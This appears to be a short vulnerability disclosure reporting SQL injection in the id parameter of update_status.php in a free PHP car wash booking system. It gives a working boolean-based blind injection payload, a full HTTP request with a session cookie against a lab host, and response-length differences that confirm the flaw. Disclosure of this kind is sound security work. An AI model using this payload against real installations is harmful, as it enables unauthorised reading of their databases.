# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/admin/bookings/update_status.php?id=

Vulnerability location: /ocwbs/admin/bookings/update_status.php?id=, id

Current database name: ocwbs_db,length is 8

[+] Payload: /ocwbs/admin/bookings/update_status.php?id=3%27%20and%20length(database())%20=8--+ // Leak place ---> id

```sql
GET /ocwbs/admin/bookings/update_status.php?id=3%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close
```

When length (database ()) = 7, Content-Length: 2012

![image](https://user-images.githubusercontent.com/54017627/169301800-23dceee7-ff00-4679-a4db-a1cfba2e057e.png)

![image](https://user-images.githubusercontent.com/54017627/169301914-b2a5831a-7ce9-49bf-9210-f66195465132.png)

When length (database ()) = 8, Content-Length: 2021

![image](https://user-images.githubusercontent.com/54017627/169301837-53ba793e-c4ab-4f96-be59-3024ba86fb02.png)

![image](https://user-images.githubusercontent.com/54017627/169301874-ba2762bf-1cfd-4b32-abd6-ef8a2093eba1.png)
